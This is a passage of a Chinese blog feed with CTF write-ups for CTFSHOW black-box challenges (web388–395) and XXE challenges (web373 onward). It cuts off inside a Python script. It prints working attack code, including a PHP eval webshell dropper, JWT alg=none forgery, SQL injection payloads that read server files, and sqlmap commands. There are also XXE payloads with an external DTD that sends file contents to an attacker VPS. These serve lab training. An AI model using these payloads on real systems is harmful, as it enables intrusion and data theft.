class="headerlink" title="web388"></a>web388</h3><p>访问路径<code>/debug</code>，输入<code>/debug/?file=/etc/passwd</code>，但是这次回显方式不一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726101223209.png"></p><p>由于暂时没有可用的方法，因此我们对后台登录页面进行目录扫描</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726101555042.png"></p><p>由前几道题可知，flag就存放在<code>/alsckdfy/check.php</code>里面，但是我们现在暂时没有权限去访问</p><p>扫描结果中我们发现路径<code>/alsckdfy/editor/</code>，访问后看到是一个编辑器</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726102012991.png"></p><p>存在文件上传页面，我们可以尝试上传一句话木马进去</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726102243669.png"></p><p>但是这里对文件上传后缀有限制</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726102213177.png"></p><p>我们把木马写好后改后缀为zip，上传文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250726102958966.png"></p><p>复制路径，然后拼接到<code>/debug/?file=/var/www/html</code>后面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726103109951.png"></p><p>访问路径<code>/1.php</code>，发现成功写入webshell</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726103226033.png"></p><p>执行命令<code>tac alsckdfy/check.php</code>得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726103416177.png"></p><h3 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h3><p>访问路径<code>/debug</code>，这次显示权限不足</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726105300526.png"></p><p>F12查看cookie，发现多了一个auth验证</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726105358160.png"></p><p>网页解密jwt，发现是加密验证，用<strong>c-jwt-cracker</strong>爆破得到密钥为123456，然后把<strong>sub</strong>那里的user改为admin</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726130224180.png"></p><p>将token复制到<strong>auth</strong>那里，刷新网页，成功绕过权限限制</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726130325950.png"></p><p>剩下的步骤跟上题一样，最后得到flag为</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726130413950.png"></p><h3 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h3><p><strong>方法一（JWT伪造）：</strong></p><p>访问路径<code>/debug</code>，依旧是显示权限不足，但是这次密钥爆破不出来了，因此换个方法，把alg改为none，sub改为admin，然后重新编码token，如果后端没有对算法进行验证，那么就可以成功绕过了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727150212179.png"></p><p>用python脚本实现，记得要先用自己jwt解码的payload复制替换dict，然后更改user为admin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把自己的payload复制替换dict，然后更改user为admin</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1753530361</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1753537561</span>,</span><br><span class="line">  <span class="string">&quot;nbf&quot;</span>: <span class="number">1753530361</span>,</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;2b4b35d9ec779539cc1d8c4c8b4659aa&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(<span class="built_in">dict</span>, key=<span class="string">&#x27;&#x27;</span>,headers=headers, algorithm=<span class="string">&quot;none&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到token后复制替换网页中的cookie，成功绕过限制</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727151019170.png"></p><p>剩下的步骤跟web388一样，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727152558175.png"></p><p><strong>方法二（数字型注入）：</strong></p><p>在首页打开<strong>灯泡往事</strong>，发现有个id存在注入漏洞</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727151418862.png"></p><p>输入单引号和双引号都没反应，经过测试，发现是数字型注入，输入<code>page.php?id=-1 union select 1,2,3#</code>，回显位置为2和3</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727151731833.png"></p><p>接下来就是把<code>alsckdfy/check.php</code>的内容写到页面即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page.php?id=-1 union select 1,2,substr((select load_file(&#x27;/var/www/html/alsckdfy/check.php&#x27;)),1,255)#</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250727152226300.png"></p><p>然后查看网页源代码得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727152303115.png"></p><h3 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h3><p><strong>方法一（JWT伪造）：</strong></p><p>上一题的解法依旧能用，跟之前一样，也是先绕过权限写入日志</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727153731737.png"></p><p>然后利用webshell读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727153757690.png"></p><p><strong>方法二（字符型注入）：</strong></p><p>在首页打开<strong>灯泡往事</strong>，发现多了一个<strong>标题输入框</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250727154533090.png"></p><p>经测试存在字符型注入，为单引号，且#被过滤，用<code>-- -</code>代替，回显位置为2和3</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727154642253.png"></p><p>把<code>alsckdfy/check.php</code>的内容写到页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=-1&#x27; union select 1,2,substr((select load_file(&#x27;/var/www/html/alsckdfy/check.php&#x27;)),1,255)-- -</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250727154921268.png"></p><p>查看网页源码即可得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727154944575.png"></p><h3 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h3><p><strong>方法一（JWT伪造）：</strong></p><p>跟web390方法一样，不过这次flag位置改变了，不在<code>alsckdfy/check.php</code>里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727155924268.png"></p><p>而是在根目录<code>/flag</code>里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727155839329.png"></p><p><strong>方法二（字符型注入）：</strong></p><p>跟上题方法一样，不过要读取的文件改成了根目录<code>/flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=-1&#x27; union select 1,2,substr((select load_file(&#x27;/flag&#x27;)),1,255)-- -</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250727160403388.png"></p><h3 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h3><p><strong>方法一（JWT伪造）：</strong></p><p>跟上题方法一样，flag也是在根目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727161002389.png"></p><p><strong>方法二（堆叠注入）：</strong></p><p>在首页最底下发现有个搜索引擎</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727163048703.png"></p><p>点第一个百度，进去之后发现是百度的搜索页面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727163228862.png"></p><p>修改网页id值，又显示其他页面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727163319794.png"></p><p>因此可以判断这里存储的是网页链接，通过传入的id值查询数据库中的url并进行访问</p><p>同时测试发现<code>/search.php?title=1</code>存在堆叠注入，需要先获取数据库的表名和列名再利用，用sqlmap</p><p>获取数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET --dbs --batch</span><br></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow --tables --batch</span><br></pre></td></tr></table></figure><p>获取列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow -T link --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250727171403864.png"></p><p>接着利用堆叠注入插入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=1&#x27;;insert into link(id, name, url) values(11,&#x27;a&#x27;,&#x27;file:///flag&#x27;);</span><br></pre></td></tr></table></figure><p>最后访问<code>/link.php?id=11</code>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727172346550.png"></p><h3 id="web394"><a href="#web394" class="headerlink" title="web394"></a>web394</h3><p><strong>方法一（JWT伪造）：</strong></p><p>跟web390方法一样，但是flag这次不在根目录<code>/flag</code>了，而是在网站目录的<code>alsckdfy/check.php</code>里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727183842499.png"></p><p><strong>方法二（堆叠注入）：</strong></p><p>跟上题方法一样，但是这次过滤了一些字符，用16进制绕过即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727184234096.png"></p><p>记得在前面加个0x表示16进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=1&#x27;;insert into link(id, name, url)</span><br><span class="line">values(10,&#x27;a&#x27;,0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);</span><br></pre></td></tr></table></figure><p>最后访问<code>/link.php?id=10</code>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727184632353.png"></p><p>查看网页源代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727184653503.png"></p><h3 id="web395"><a href="#web395" class="headerlink" title="web395"></a>web395</h3><p><strong>方法一（JWT伪造）：</strong></p><p>解法跟上题一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727190828512.png"></p><p><strong>方法二（堆叠注入）：</strong></p><p>解法也是跟上题一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727190950137.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>NaecoYes：<a href="https://blog.csdn.net/q20010619/article/details/120639310">https://blog.csdn.net/q20010619/article/details/120639310</a></p>]]></content>
    
    
    <summary type="html">CTFSHOW 黑盒测试专题详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
    <category term="CTF练习" scheme="https://waynejoon.github.io/tags/CTF%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | XXE题解 web373 - web378</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-xxe-web373-web378/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-xxe-web373-web378/</id>
    <published>2025-07-24T10:42:23.000Z</published>
    <updated>2025-07-24T11:12:23.547Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML，全称为可扩展标记语言（eXtensible Markup Language），设计宗旨是传输和存储数据</p><p>可以把它和HTML对比来理解：</p><ul><li><strong>HTML</strong> 的标签（如<code>&lt;h1&gt;</code>, <code>&lt;p&gt;</code>）是预定义好的，主要功能是告诉浏览器如何<strong>显示</strong>内容。</li><li><strong>XML</strong> 的标签则可以由开发者根据需求<strong>自己定义</strong>，用来清晰地描述数据的结构和含义。</li></ul><p>举个例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>小明<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>小红<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>提醒<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>别忘了周五的会议！<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为了更好地理解XXE，我们还需要了解XML中两个与漏洞密切相关的关键组件：<code>DOCTYPE</code> 和 <code>ENTITY</code></p><ul><li><strong>DOCTYPE (文档类型声明)</strong> ：它通常出现在XML文档的顶部，用于定义该文档的结构和规则。对于XXE漏洞来说，<code>DOCTYPE</code>最重要的作用是，它提供了一个可以定义实体（ENTITY）的地方</li><li><strong>ENTITY (实体)</strong> ：必须在<code>DOCTYPE</code>声明中定义，主要有两种：<ul><li><strong>内部实体</strong>：像一个简单的文本变量，方便在文档中复用。例如：<code>&lt;!ENTITY author &quot;Wayne&quot;&gt;</code>，之后在文档中使用的 <code>&amp;author;</code> 就会被替换为 “Wayne”</li><li><strong>外部实体</strong>：这是XXE漏洞的核心。它允许我们引用<strong>外部资源</strong>的内容，例如服务器上的一个文件或一个网址。例如：<code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></li></ul></li></ul><h2 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h2><p>XXE全称是“XML外部实体注入”（XML External Entity Injection），当一个应用程序接收并解析了用户提交的XML数据，但其XML解析器配置不当时，就容易产生XXE漏洞</p><p>流程大概如下</p><ol><li>构造一个恶意的XML文档</li><li>在文档中定义一个指向服务器本地敏感文件的外部实体，例如： <code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></li><li>在XML数据中引用这个实体 <code>&amp;xxe;</code></li><li>服务器在解析这段XML时，会查找并读取 <code>/etc/passwd</code> 文件的内容，并用它替换掉 <code>&amp;xxe;</code></li><li>最后，攻击者通过页面的回显（有回显XXE）或将数据发送到自己的服务器（无回显XXE）来窃取信息</li></ol><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><p>题目给了源码，我们可以分析一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724134347443.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//允许加载外部实体，在PHP 8.0及以上版本，此项默认为true。</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//从HTTP请求的body中读取原始数据，一般是POST请求的内容。</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line"><span class="comment">//新建一个DOMDocument对象，用于处理XML。</span></span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="comment">//LIBXML_NOENT: 替换XML文档中的实体；LIBXML_DTDLOAD: 允许加载外部DTD。</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="comment">//把DOM对象转换为PHP对象。</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br></pre></td></tr></table></figure><p>由源码可知，这是个<strong>有回显</strong>的XXE，因此直接POST注入即可</p><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对应源码的$ctfshow = $creds-&gt;ctfshow; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724140022120.png"></p><h3 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h3><p>分析源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724141018573.png"></p><p>相比上一题，这一题少了回显代码，也就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br></pre></td></tr></table></figure><p>因此这是个<strong>无回显</strong>的XXE，需要用到vps进行数据外带显示</p><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps地址/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br></pre></td></tr></table></figure><p>然后在vps的<strong>网站根目录</strong>创建test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!-- “&amp;#x25;”是 % 的意思,因为是嵌套引用，所以不能直接写% --&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; out SYSTEM &#x27;http://vps地址:1234/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%out;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724142912722.png"></p><p>保存文件并退出Vim：按下ESC进入命令模式，然后输入<code>:wq</code>并按回车键</p><p>最后在服务器用nc监听1234端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>接着发送POST请求</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724143630436.png"></p><p>重新回到vps查看加密内容，然后base64解码即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724143750217.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250724143825410.png"></p><p>我们来分析一下思路，简单来说就是初始Payload调用了外部DTD，外部DTD中先用一个实体<code>%eval;</code>去<strong>定义</strong>另一个能发送数据的实体<code>%out;</code>，然后再<strong>调用</strong>这个新实体将文件内容外带出来</p><p>那为什么要这样子套娃，直接调用不可以吗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % out SYSTEM &quot;http://vps地址:1234/?x=%file;&quot;&gt;  %out;</span><br></pre></td></tr></table></figure><p>如果直接调用，上面第二步中的 <code>&lt;!ENTITY % out ...&gt;</code> 会直接导致XML解析器报错。因为在解析器看来，<code>%file;</code> 这个<strong>引用</strong>被用在了另一个实体 <code>out</code> 的<strong>定义字符串</strong>里，这是不被允许的</p><p>因此我们需要嵌套使用，用外部实体<code>%eval;</code>把内层命令伪装成一个字符串，当外部实体被调用后，此时<code>%file;</code> 实体已经被定义过了，最后再调用<code>%out;</code>，就可以成功执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!-- “&amp;#x25;”是 % 的意思,因为是嵌套引用，所以不能直接写% --&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; out SYSTEM &#x27;http://vps地址:1234/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%out;</span><br></pre></td></tr></table></figure><h3 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h3><p>先看看源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724154423355.png"></p><p>跟上一题差不多，不过这次多了一个过滤条件，由于它是匹配整一个语句<code>&lt;?xml version=&quot;1.0&quot;</code>，因此有很多方法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法一：</p><p>在xml和version中加一个空格</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps地址/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724160447113.png"></p><p>方法二：</p><p>直接把<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>去掉</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps地址/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724160517559.png"></p><p>方法三：</p><p>把双引号改成单引号，即<code>&lt;?xml version=&#39;1.0&#39; encoding=&quot;UTF-8&quot;?&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps地址/test.dtd&quot;</span>&gt;</span>%xxe;]&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724160340485.png"></p><p>随便选一种方法做即可，其他步骤跟上一题一样，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724160023562.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250724160050518.png"></p><h3 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h3><p>先看源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724161558421.png"></p><p>相比上一题，这题的过滤条件多了一个检测大小写功能，但是不影响做题，可以用上一题的方法</p><h3 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h3><p>分析源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724164321245.png"></p><p>这次多了一个http的过滤，可以用编码绕过，xml不仅支持UTF-8编码，也支持UTF-16、UTF-32和EBCDIC编码</p><p>因此我们在web375绕过<code>&lt;?xml version=&quot;1.0&quot;</code>的基础上，加一个编码转换即可，用python脚本完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://48e31982-9b66-42aa-b386-f34f7b7f8d36.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt;</span></span><br><span class="line"><span 